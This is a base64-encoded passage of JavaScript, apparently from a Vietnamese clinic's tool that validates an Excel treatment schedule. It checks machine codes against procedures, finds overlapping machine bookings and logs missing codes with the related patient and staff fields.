CAgICAgIChjb2wgKyAnICcgKyAoaGVhZGVyTGluZTJbaW5kZXhdIHx8ICcnKSkudHJpbSgpDQogICAgKTsNCg0KICAgIC8vIFTDrG0gY+G7mXQgbcOjIG3DoXkNCiAgICBjb25zdCBtYWNoaW5lQ29kZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IA0KICAgICAgICBoLmluY2x1ZGVzKCJNw6MgbcOheSIpIHx8IGguaW5jbHVkZXMoIk3DoyBtw6F5IHRoZW8gdGjhu6cgdGh14bqtdCIpDQogICAgKTsNCiAgICAgLy8gVMOsbSBj4buZdCBiw6FjIHPhu7kgY2jhu4kgxJHhu4tuaA0KICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkgdHJvbmcgZmlsZSBFeGNlbCIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gVMOsbSBjw6FjIGPhu5l0IGtow6FjIGPhuqduIHRoaeG6v3QNCiAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQoJY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCWNvbnN0IHBhdGllbnRhZ2VJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUdeG7lWkiKSk7DQogICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRleF07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZUluZm8gPSBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBDaOG7iSBraeG7g20gdHJhIDMgdGjhu6cgdGh14bqtdCBjw7MgbWFjaGluZUNvZGUNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBleHBlY3RlZENvZGVzID0gQXJyYXkuaXNBcnJheShwcm9jZWR1cmVJbmZvLm1hY2hpbmVDb2RlKSANCiAgICAgICAgICAgICAgICA/IHByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUgDQogICAgICAgICAgICAgICAgOiBbcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIG3DoyBtw6F5IGPDsyBjaOG7qWEgYuG6pXQga+G7syBtw6MgZXhwZWN0ZWQgbsOgbyBraMO0bmcNCiAgICAgICAgICAgIGNvbnN0IGlzVmFsaWRNYWNoaW5lID0gZXhwZWN0ZWRDb2Rlcy5zb21lKGNvZGUgPT4gDQogICAgICAgICAgICAgICAgbWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcyhjb2RlLnRvVXBwZXJDYXNlKCkpDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIWlzVmFsaWRNYWNoaW5lICYmIG1hY2hpbmVDb2RlICE9PSAnJykgew0KICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIFjDoWMgxJHhu4tuaCB0aMO0bmcgYsOhbyBs4buXaSBj4bulIHRo4buDIGThu7FhIHRyw6puIG3DoyBtw6F5IG5o4bqtcCBzYWkNCiAgICAgICAgICAgICAgICBsZXQgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSBtw6F5IGNoxrBhIHjDoWMgxJHhu4tuaCc7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoJ03EkEMnKSkgew0KICAgICAgICAgICAgICAgICAgICBlcnJvck1lc3NhZ2UgPSAnR+G6r24gbmjhuqdtIG3DoXkgxJFp4buHbiBjaMOibSBy4buTaSc7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCfEkEhOJykpIHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSDEkcOobiBo4buTbmcgbmdv4bqhaSBy4buTaSc7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdHSCcpIHx8IG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoJ09HSCcpKSB7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gbcOheSBnacOhYyBoxqFpIHLhu5NpJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWFjaGluZUVycm9yTG9nLnB1c2goew0KICAgICAgICAgICAgICAgICAgICByb3dOdW1iZXI6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsICAgICANCgkJCQkJcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlkb2N0b3I6IGRvY3RvckluZGV4ICE9PSAtMSA/IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAvLyBUaMOqbSBiw6FjIHPhu7kNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICBzdGFydFRpbWU6IHN0YXJ0Py5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICBlbmRUaW1lOiBlbmQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBtYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgZXhwZWN0ZWRDb2RlczogZXhwZWN0ZWRDb2Rlcy5qb2luKCcgaG/hurdjICcpLA0KICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiBlcnJvck1lc3NhZ2UgLy8gU+G7rSBk4bulbmcgdGjDtG5nIGLDoW8gY+G7pSB0aOG7gw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6F5IGTDsm5nICR7cm93TnVtYmVyfTpgLCBlcnJvcik7DQogICAgICAgIH0NCiAgICB9KTsNCn0NCg0KLy8gSMOgbSBraeG7g20gdHJhIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGNoZWNrTWFjaGluZUNvbmZsaWN0cyhwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIG1hY2hpbmVDb25mbGljdExvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgIC8vIFTDrG0gY+G7mXQgYsOhYyBz4bu5IGNo4buJIMSR4buLbmgNCiAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCiAgICANCiAgICBpZiAobWFjaGluZUNvZGVJbmRleCA9PT0gLTEpIHsNCiAgICAgICAgY29uc29sZS5sb2coIktow7RuZyB0w6xtIHRo4bqleSBj4buZdCBtw6MgbcOheSIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIGNvbnN0IG1hY2hpbmVQcm9jZWR1cmVzID0gW107DQogICAgDQogICAgLy8gTOG7jWMgY8OhYyB0aOG7pyB0aHXhuq10IGPDsyBz4butIGThu6VuZyBtw6F5DQogICAgcm93cy5mb3JFYWNoKChyb3csIGluZGV4KSA9PiB7DQogICAgICAgIGNvbnN0IHJvd051bWJlciA9IGluZGV4ICsgMTA7DQogICAgICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCFyb3cgfHwgcm93Lmxlbmd0aCA9PT0gMCkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVOYW1lID0gcm93W2NvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpXTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSB8fCAhUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmZvID0gUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBtYWNoaW5lQ29kZSA9IChyb3dbbWFjaGluZUNvZGVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpOw0KICAgICAgICAgICAgaWYgKCFtYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICANCiAgICAgICAgICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQoJCSAgICBjb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQoJCQljb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgICAgICAgICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICAgICAgICAgIGNvbnN0IHN0YXJ0SW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKSk7DQogICAgICAgICAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHN0YXJ0ICYmIGVuZCkgew0KICAgICAgICAgICAgICAgIG1hY2hpbmVQcm9jZWR1cmVzLnB1c2goew0KICAgICAgICAgICAgICAgICAgICByb3dOdW1iZXI6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCXBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IG9wZXJhdG9ySW5kZXggIT09IC0xID8gcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJZG9jdG9yOiBkb2N0b3JJbmRleCAhPT0gLTEgPyByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywgLy8gVGjDqm0gYsOhYyBz4bu5DQogICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICBkaXNwbGF5U3RhcnQ6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBtYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogcHJvY2VkdXJlSW5mbw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgeOG7rSBsw70gbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aGVvIHThu6tuZyBtw6F5IFbDgCB04burbmcgbmfDoHkNCiAgICBjb25zdCBtYWNoaW5lR3JvdXBzID0ge307DQogICAgDQogICAgbWFjaGluZVByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5tYWNoaW5lQ29kZX1fJHtwcm9jLmRhdGV9YDsgLy8gS+G6v3QgaOG7o3AgbcOjIG3DoXkgKyBuZ8OgeQ0KICAgICAgICBpZiAoIW1hY2hpbmVHcm91cHNba2V5XSkgew0KICAgICAgICAgICAgbWFjaGluZUdyb3Vwc1trZXldID0gW107DQogICAgICAgIH0NCiAgICAgICAgbWFjaGluZUdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQogICAgDQogICAgT2JqZWN0LnZhbHVlcyhtYWNoaW5lR3JvdXBzKS5mb3JFYWNoKHByb2NlZHVyZXMgPT4gew0KICAgICAgICBpZiAocHJvY2VkdXJlcy5sZW5ndGggPCAyKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICBwcm9jZWR1cmVzLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgDQogICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgcHJvY2VkdXJlcy5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgY29uc3QgcHJldiA9IHByb2NlZHVyZXNbaSAtIDFdOw0KICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IHByb2NlZHVyZXNbaV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIGPDsyB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbiBraMO0bmcNCiAgICAgICAgICAgIGlmIChjdXJyZW50LnN0YXJ0IDwgcHJldi5lbmQpIHsNCiAgICAgICAgICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBwcmV2Lm1hY2hpbmVDb2RlLA0KICAgICAgICAgICAgICAgICAgICBkYXRlOiBwcmV2LmRhdGUsIC8vIFRow6ptIG5nw6B5IMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgICAgICAgICBjb25mbGljdFByb2NlZHVyZXM6IFtwcmV2LCBjdXJyZW50XSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogYE3DoXkgJHtwcmV2Lm1hY2hpbmVDb2RlfSDEkcaw4bujYyBz4butIGThu6VuZyDEkeG7k25nIHRo4budaSBjaG8gbmhp4buBdSBi4buHbmggbmjDom4gdHJvbmcgbmfDoHkgJHtwcmV2LmRhdGV9YA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSk7DQp9DQpmdW5jdGlvbiBjaGVja01pc3NpbmdNYWNoaW5lQ29kZXMocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBtaXNzaW5nTWFjaGluZUxvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgICAvLyBUw6xtIGPhu5l0IGLDoWMgc+G7uSBjaOG7iSDEkeG7i25oDQogICAgY29uc3QgZG9jdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiQsOhYyBz4bu5IGNo4buJIMSR4buLbmgiKSk7DQoNCiAgICBpZiAobWFjaGluZUNvZGVJbmRleCA9PT0gLTEpIHsNCiAgICAgICAgY29uc29sZS5sb2coIktow7RuZyB0w6xtIHRo4bqleSBj4buZdCBtw6MgbcOheSB0cm9uZyBmaWxlIEV4Y2VsIik7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyBUw6xtIGPDoWMgY+G7mXQga2jDoWMgY+G6p24gdGhp4bq/dA0KICAgIGNvbnN0IHByb2NlZHVyZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQiKSk7DQogICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCgljb25zdCBwYXRpZW50SWRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJNw6MgQk4iKSk7DQoJY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KICAgIGNvbnN0IHN0YXJ0SW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKSk7DQogICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgY29uc3QgZGF0ZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk5nw6B5IHRo4buxYyBoaeG7h24iKSk7DQoNCiAgICBjb25zdCByb3dzID0ganNvbkRhdGEuc2xpY2UoOSk7DQogICAgDQogICAgLy8gRGFuaCBzw6FjaCB0aOG7pyB0aHXhuq10IGPhuqduIGtp4buDbSB0cmEgbcOjIG3DoXkNCiAgICBjb25zdCBwcm9jZWR1cmVzVG9DaGVjayA9IFsNCiAgICAgICAgIsSRaeG7h24gY2jDom0gW2tpbSBuZ+G6r25dIiwNCiAgICAgICAgIsSRaeG7gXUgdHLhu4sgYuG6sW5nIHRpYSBo4buTbmcgbmdv4bqhaSIsIA0KICAgICAgICAiZ2nDoWMgaMahaSINCiAgICBdOw0KICAgIA0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IChyb3dbcHJvY2VkdXJlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSB0aOG7pyB0aHXhuq10IGPDsyB0cm9uZyBkYW5oIHPDoWNoIGPhuqduIGtp4buDbSB0cmEga2jDtG5nDQogICAgICAgICAgICBjb25zdCBzaG91bGRDaGVjayA9IHByb2NlZHVyZXNUb0NoZWNrLnNvbWUocHJvYyA9PiANCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVOYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMocHJvYy50b0xvd2VyQ2FzZSgpKQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFzaG91bGRDaGVjaykgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBtYWNoaW5lQ29kZSA9IChyb3dbbWFjaGluZUNvZGVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpOw0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlRGF0ZSA9IGRhdGVJbmRleCAhPT0gLTEgPyAocm93W2RhdGVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpIDogJyc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIE7hur91IG3DoyBtw6F5IHRy4buRbmcgdGjDrCBiw6FvIGzhu5dpDQogICAgICAgICAgICBpZiAoIW1hY2hpbmVDb2RlKSB7DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWlzc2luZ01hY2hpbmVMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIHJvd051bWJlcjogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogb3BlcmF0b3JJbmRleCAhPT0gLTEgPyByb3dbb3BlcmF0b3JJbmRleF0gfHw